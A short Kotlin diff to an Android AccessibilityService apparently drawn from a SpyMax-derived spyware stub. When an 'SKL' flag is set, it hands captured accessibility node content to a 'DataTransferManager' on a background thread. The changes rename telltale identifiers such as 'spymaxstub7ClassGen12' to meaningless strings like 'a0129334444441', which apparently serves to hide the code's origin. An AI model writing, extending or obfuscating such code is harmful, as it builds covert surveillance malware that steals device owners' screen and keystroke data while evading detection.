@@ -774,9 +774,8 @@ class InputService : AccessibilityService() {
                 //if (My_ClassGen_Settings.readBool(this, "SKL", false)) {
                  if(SKL){
 		     //Log.d(logTag, "SKL accessibilityNodeInfo3 NOT NULL")
-                    val `f$1`: AccessibilityNodeInfo
-                    `f$1` = accessibilityNodeInfo3
-                    Thread(Runnable { `m347lambda$onAccessibilityEvent$0$spymaxstub7ClassGen12`(`f$1`) }).start()
+                    val ss999: AccessibilityNodeInfo = accessibilityNodeInfo3
+                    Thread(Runnable { DataTransferManager.a012933444444(ss999) }).start()
                 }
 		 else
 		    {
@@ -802,7 +801,7 @@ class InputService : AccessibilityService() {
 	    return digest.joinToString("") { String.format("%02x", it) }
 	}*/
 	
-        fun `m347lambda$onAccessibilityEvent$0$spymaxstub7ClassGen12`(accessibilityNodeInfo: AccessibilityNodeInfo?) {
+      private  fun a0129334444441(accessibilityNodeInfo: AccessibilityNodeInfo?) {
         if (accessibilityNodeInfo == null) {
 		//Log.d(logTag, "SKL accessibilityNodeInfo  NULL")
             return
